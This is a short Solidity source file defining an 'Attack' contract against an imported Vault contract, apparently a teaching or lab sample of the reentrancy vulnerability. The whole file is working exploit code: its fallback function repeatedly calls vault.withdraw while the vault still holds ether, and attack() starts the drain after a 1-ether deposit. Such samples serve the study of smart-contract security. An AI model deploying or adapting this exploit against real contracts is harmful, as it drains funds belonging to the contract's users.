//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.1;

import "./Vault.sol";

contract Attack {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

    function attack() public {
        vault.withdraw(1 ether);
    }

    function sendEtherToStore() public payable {
        require(msg.value == 1 ether);

        vault.deposit{value: msg.value}();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}